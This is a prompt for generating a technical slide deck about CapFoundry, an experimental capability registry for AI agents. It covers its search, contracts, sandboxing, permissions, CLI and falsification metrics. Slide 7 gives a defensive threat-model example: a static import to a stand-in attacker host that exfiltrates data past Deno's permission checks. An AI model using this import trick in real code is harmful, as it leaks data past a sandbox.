# Prompt for Claude Design — CapFoundry feature deck

Paste everything below the line into Claude Design. It is self-contained: every number and name in
it is taken from the repository, so nothing needs inventing.

---

Build me a slide deck about **CapFoundry**, an experimental capability registry for AI agents. English
throughout. Around 16 artboards, 16:9.

**Audience:** software developers and engineering leads evaluating how to bring AI into their
development lifecycle. Technical, sceptical, allergic to product-launch language. They will judge the
deck on whether it tells them something they did not already know.

**Tone:** plain and confident. No superlatives, no "revolutionary", no rocket emoji. This is an
experiment that is allowed to fail, and the deck should sound like an engineer explaining a design
rather than a company announcing a product. Where something is unproven, say so on the slide.

**Visual direction:** restrained and technical. A single accent colour, otherwise near-monochrome.
Real monospace for anything that is code, a JSON key or a capability name. Generous whitespace; one
idea per slide. Diagrams as clean line work, not as clip-art. Dark and light both fine — pick one and
commit. Avoid stock imagery, gradients and glow.

---

## The deck

### 1. Title
**CapFoundry** — "Don't generate what you already know."
Subtitle: an experimental capability registry for AI agents. Experiment, not a product.

### 2. The problem
Models reinvent the wheel. The same haversine formula, the same CSV delimiter sniffer, the same slug
function, written fresh in every session, with no memory that any of it was ever solved. Each version
is correct-ish, slightly different, and has to be reviewed again.
**The line to land:** the problem isn't that AI writes bad code — it's that it writes good code
cheaply enough that nothing ever accumulates.

### 3. The idea
Before an agent solves a task, it asks its local manager (CFCM): *do we already have this?*
Three answers, all normal: `MATCH`, `PARTIAL_MATCH`, `NO_MATCH`.
Shorthand for the architecture: **centralize knowledge, decentralize execution.**

### 4. `NO_MATCH` is a feature
A registry embarrassed to say it has nothing starts returning things that nearly fit — and a
near-miss is worse than no answer, because the agent uses it. Search returns *why* it matched
(`matchedOn`), not just a score, so a caller can reject on evidence.

### 5. The flow — diagram
`agent question → lexical search → resolve artifact → verify sha256 → sandboxed execution → result`
with a branch off "no match" going to `generate normally → maybe submit as candidate`.

### 6. Contracts
Every capability ships a `capability.json`: `inputSchema`, `outputSchema`, `effect`, `exposure`,
`permissions`, a sealed `sha256`, tests, licence and provenance. Show a trimmed real example.

### 7. Effects are enforced, not promised
`PURE` runs in a Deno subprocess with **no `--allow-* flag at all`**. The descriptor is not trusted;
the runtime enforces it.
**The uncomfortable detail that makes the slide:** zero permissions is not a sandbox. Deno does not
gate module loading on `--allow-net`, so a static `import "https://attacker.example/?data=…"` is
fetched before any permission check runs — exfiltration with nothing granted. Closed with
`--no-remote`, `--no-npm`, `--no-config`, `--no-lock`, `--node-modules-dir=none` and `clearEnv`.
The flag list is the threat model, not tidiness.

### 8. `NETWORK` is an intersection
A capability *declares* `permissions.network: ["nominatim.openstreetmap.org"]`. That is a request,
not a grant. CFCM intersects it with local policy in `cfcm.json`, off by default.
Verified four ways: granted that host → works. Granted nothing → refused. Granted `example.com` →
**still refused**. Per-host, not a boolean.

### 9. One search space, three namespaces
`CapFoundry.*` public · `Netsi.*` private, registered locally so no central service knows the
organisation exists · `Local.*` machine-only. All searched together; only the policies differ.

### 10. Two ways to get an answer
`return: "result"` runs it and gives you the answer. `return: "artifact"` gives you the source to put
in your own project. `exposure` gates each independently — the private fixture executes but refuses
to hand back its source (`EXPOSURE_DENIED`).

### 11. The ten capabilities
A clean table: name, effect, one line each.
`csv.detectDelimiter` PURE · `date.businessDaysBetween` PURE · `geo.distance` PURE ·
`geo.geocode` **NETWORK** · `json.schema.infer` PURE · `sun.times` PURE · `text.editDistance` PURE ·
`text.slugify` PURE · `ui.dataTable` PURE · `validation.iban` PURE.
Note under the table: `sun.times` is a BSD-2-Clause port of SunCalc with licence and provenance
retained; `text.editDistance` arrived through the candidate loop rather than being designed.

### 12. Refuse rather than guess — `geo.geocode`
Asking for "Viborg" returns `status: "ambiguous"` and **no match at all**, with candidates in
Denmark, the United States and Russia. Pass `countryCode: "DK"` and it resolves.
Silently taking the first hit would compute correctly against the wrong place and return something
entirely credible. That is the worst failure a registry can distribute: wrong, plausible, reused.

### 13. The loop closes
An agent that writes something deterministic and generally useful can submit it as a candidate.
Nothing is published; a person promotes it. `CapFoundry.text.editDistance` entered the registry
exactly this way.

### 14. From a shell
`cfcm search`, `cfcm invoke`, `cfcm describe`, `cfcm list`. Arguments come from the capability's own
`inputSchema`, so you rarely write JSON. Results on stdout, diagnostics on stderr, so capabilities
compose:
`cfcm invoke CapFoundry.geo.geocode Aarhus` piped into `geo.distance` gives 289.4 km to Hamburg —
two capabilities neither of which knew about the other.
Exit `2` means "no confident match", deliberately not `1`: a search that finds nothing is a normal
answer.

### 15. Telemetry and Explore
Local by default, uploads off, and the search query is **opt-in** and stripped at the upload
boundary. A static Explore page shows most used, most searched, fastest growing, new candidates,
recently added — and **Missing**, the repeated questions with no answer, which is the only section
that says what to build rather than what already happened.

### 16. It is allowed to fail
Seven falsification conditions were written down before the first line of code. Current state, shown
honestly:
- OBJ-1 hit rate **0.947** (18/19), threshold ≥ 0.80 — *provisional*
- OBJ-2 wrong-match **0.000** (0/14), ceiling ≤ 0.05 — *provisional*
- OBJ-3 overhead **24.9 ms** p95 on an M-series Mac, budget ≤ 250 ms
- Three conditions **not yet measured**, one out of scope for the MVP's time horizon
The two provisional ones are marked so because the test queries were written by the same person who
wrote the capabilities' aliases — that measures internal consistency, not independent recall. And one
number already published as 0.000 turned out to be 0.105 and was corrected in public.
**Closing line:** the verdict — continue, pivot, or falsify — gets published whichever way it lands.

---

## Rules for the whole deck

- Every number above is real. Do not round them, invent new ones, or add metrics that are not here.
- Where something is unproven, the slide says so. Do not upgrade "provisional" to a tick.
- Prefer one sentence a reader remembers over three they skim.
- Code and JSON in monospace, syntax-correct, trimmed to what the slide needs.
- No slide should need a presenter to make sense.
